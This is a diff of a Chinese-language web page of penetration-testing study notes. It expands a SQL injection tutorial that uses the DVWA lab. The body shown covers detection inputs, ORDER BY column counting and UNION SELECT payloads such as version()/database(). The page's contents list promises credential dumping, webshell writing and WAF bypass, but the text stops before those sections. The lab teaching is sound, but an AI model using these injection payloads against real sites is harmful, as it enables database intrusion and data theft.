@@ -29,7 +29,7 @@
     
     
       
-        <title>SQL注入 - 渗透测试学习笔记</title>
+        <title>SQL 注入完整渗透测试流程 - 渗透测试学习笔记</title>
       
     
     
@@ -118,7 +118,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SQL注入
+              SQL 注入完整渗透测试流程
             
           </span>
         </div>
@@ -439,6 +439,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL 注入完整渗透测试流程
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="SQL%E6%B3%A8%E5%85%A5.html" class="md-nav__link md-nav__link--active">
         
   
@@ -446,7 +464,7 @@
   <span class="md-ellipsis">
     
   
-    SQL注入
+    SQL 注入完整渗透测试流程
   
 
     
@@ -455,6 +473,646 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段一：判断注入点（找漏洞）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段一：判断注入点（找漏洞）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 判断是否存在 SQL 注入
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 判断注入类型
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段二：信息收集（探测数据库结构）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段二：信息收集（探测数据库结构）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 判断列数（Order By）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-union-select" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 找回显位（Union Select）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 获取数据库基本信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 获取所有数据库名
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 获取指定数据库的表名
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.6 获取指定表的列名
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段三：数据提取（脱库）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段三：数据提取（脱库）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 提取用户名和密码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 分行提取（清晰显示）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 破解密码哈希
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段四：进阶技巧
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段四：进阶技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-load_file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 读取文件（Load_file）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-webshellinto-outfile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 写入 Webshell（Into Outfile）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 绕过 WAF 和过滤
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 绕过 WAF 和过滤">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#medium-mysqli_real_escape_string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medium 级别（mysqli_real_escape_string 过滤）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#high-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High 级别（弹窗输入 + Session 验证）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 布尔盲注（无回显数据）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.5 时间盲注（完全无回显）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段五：工具化测试（Sqlmap）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段五：工具化测试（Sqlmap）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 基础扫描
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 指定数据库和表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-burp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 从 Burp 导入请求
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 高级选项
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段六：防御与修复
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段六：防御与修复">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 漏洞成因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 防御方法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.2 防御方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法一：预编译语句（最安全）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法二：输入验证
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法三：转义特殊字符
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 最佳实践
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段七：渗透测试报告模板
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段七：渗透测试报告模板">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.1 漏洞标题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.2 漏洞等级
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.3 漏洞描述
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.4 漏洞位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.5 复现步骤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.6 漏洞影响
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#77" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.7 修复建议
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#78" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.8 修复后的代码示例
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附录：常用 Payload 速查表
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="附录：常用 Payload 速查表">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断注入点
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        联合查询
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        报错注入
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        布尔盲注
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        时间盲注
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        堆叠查询（权限高时可用）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        学习检查清单
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -628,6 +1286,635 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段一：判断注入点（找漏洞）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段一：判断注入点（找漏洞）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 判断是否存在 SQL 注入
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 判断注入类型
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段二：信息收集（探测数据库结构）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段二：信息收集（探测数据库结构）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 判断列数（Order By）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-union-select" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 找回显位（Union Select）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 获取数据库基本信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 获取所有数据库名
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 获取指定数据库的表名
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.6 获取指定表的列名
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段三：数据提取（脱库）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段三：数据提取（脱库）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 提取用户名和密码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 分行提取（清晰显示）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 破解密码哈希
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段四：进阶技巧
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段四：进阶技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-load_file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 读取文件（Load_file）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-webshellinto-outfile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 写入 Webshell（Into Outfile）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 绕过 WAF 和过滤
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 绕过 WAF 和过滤">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#medium-mysqli_real_escape_string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medium 级别（mysqli_real_escape_string 过滤）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#high-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High 级别（弹窗输入 + Session 验证）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 布尔盲注（无回显数据）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.5 时间盲注（完全无回显）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段五：工具化测试（Sqlmap）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段五：工具化测试（Sqlmap）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 基础扫描
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 指定数据库和表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-burp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 从 Burp 导入请求
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 高级选项
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段六：防御与修复
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段六：防御与修复">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 漏洞成因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 防御方法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.2 防御方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法一：预编译语句（最安全）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法二：输入验证
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法三：转义特殊字符
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 最佳实践
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        阶段七：渗透测试报告模板
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="阶段七：渗透测试报告模板">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.1 漏洞标题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.2 漏洞等级
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.3 漏洞描述
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.4 漏洞位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.5 复现步骤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.6 漏洞影响
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#77" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.7 修复建议
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#78" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.8 修复后的代码示例
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附录：常用 Payload 速查表
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="附录：常用 Payload 速查表">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断注入点
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        联合查询
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        报错注入
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        布尔盲注
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        时间盲注
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        堆叠查询（权限高时可用）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        学习检查清单
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -643,10 +1930,536 @@
 
 
 
-<h1 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<h1 id="sql">SQL 注入完整渗透测试流程<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
 <p>SQL 注入（SQL Injection）是一种常见的网络攻击手段，攻击者通过在输入字段或请求中注入恶意的 SQL 语句，操控数据库执行意图之外的操作。</p>
-<p>1、判断</p>
-<p>是否存在sql注入</p>
+<hr />
+<h2 id="_1">阶段一：判断注入点（找漏洞）<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="11-sql">1.1 判断是否存在 SQL 注入<a class="headerlink" href="#11-sql" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：确认输入参数是否直接拼接到 SQL 查询中</p>
+<p><strong>测试方法</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>预期行为</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1</code></td>
+<td>正常返回数据</td>
+<td>基线测试</td>
+</tr>
+<tr>
+<td><code>1'</code></td>
+<td>报错或异常</td>
+<td>单引号破坏 SQL 语法</td>
+</tr>
+<tr>
+<td><code>1' and '1'='1</code></td>
+<td>正常返回数据</td>
+<td>恒真条件，闭合引号</td>
+</tr>
+<tr>
+<td><code>1' and '1'='2</code></td>
+<td>无数据或异常</td>
+<td>恒假条件</td>
+</tr>
+</tbody>
+</table>
+<p><strong>DVWA 实操</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>正常输入：1
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>测试输入：1&#39;
+</code></pre></div></p>
+<p>如果看到类似 <code>You have an error in your SQL syntax</code> 的报错，或者页面显示异常，说明<strong>存在注入点</strong>。</p>
+<hr />
+<h3 id="12">1.2 判断注入类型<a class="headerlink" href="#12" title="Permanent link">&para;</a></h3>
+<p><strong>数字型注入</strong>（参数直接拼接，无引号包裹）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+测试 payload：<code>1 and 1=1</code> vs <code>1 and 1=2</code></p>
+<p><strong>字符型注入</strong>（参数用单引号包裹）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span>
+</code></pre></div>
+测试 payload：<code>1' and '1'='1</code> vs <code>1' and '1'='2</code></p>
+<p><strong>搜索型注入</strong>（参数在 LIKE 中）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%input%&#39;</span>
+</code></pre></div>
+测试 payload：<code>%' and 1=1 and '%'='</code></p>
+<p><strong>DVWA Low 级别是字符型注入</strong>，所以后续 payload 都要用 <code>'</code> 闭合。</p>
+<hr />
+<h2 id="_2">阶段二：信息收集（探测数据库结构）<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="21-order-by">2.1 判断列数（Order By）<a class="headerlink" href="#21-order-by" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：确定当前 SQL 查询返回多少列，为后续 UNION 注入做准备</p>
+<p><strong>方法</strong>：用 <code>ORDER BY</code> 逐步增加列号，直到报错</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>1&#39; order by 1-- -     ✅ 正常
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>1&#39; order by 2-- -     ✅ 正常
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>1&#39; order by 3-- -     ❌ 报错：Unknown column &#39;3&#39; in &#39;order clause&#39;
+</code></pre></div>
+<p><strong>结论</strong>：当前查询有 <strong>2 列</strong></p>
+<p><strong>注释符说明</strong>：
+- <code>-- -</code>（两个减号+空格+减号）：MySQL 注释，<code>--</code> 后必须有空格
+- <code>#</code>：也可以用，但在 URL 中需要编码成 <code>%23</code></p>
+<hr />
+<h3 id="22-union-select">2.2 找回显位（Union Select）<a class="headerlink" href="#22-union-select" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：确定哪些列的数据会显示在页面上</p>
+<p><strong>原理</strong>：用 UNION 联合查询，让第一个查询返回空结果，第二个查询的数据就会显示</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>1&#39; union select 1,2-- -
+</code></pre></div>
+<p><strong>页面显示</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>First name: 1
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Surname: 2
+</code></pre></div></p>
+<p><strong>结论</strong>：第 1 列和第 2 列都有回显，可以用来输出数据。</p>
+<p><strong>为什么第一个查询要返回空？</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>-1&#39; union select 1,2-- -
+</code></pre></div>
+用 <code>-1</code> 或不存在的 ID，让第一个查询无结果，UNION 后的数据才会显示。</p>
+<hr />
+<h3 id="23">2.3 获取数据库基本信息<a class="headerlink" href="#23" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：探测数据库版本、当前用户、当前数据库名</p>
+<p><strong>Payload</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>-1&#39; union select version(),database()-- -
+</code></pre></div></p>
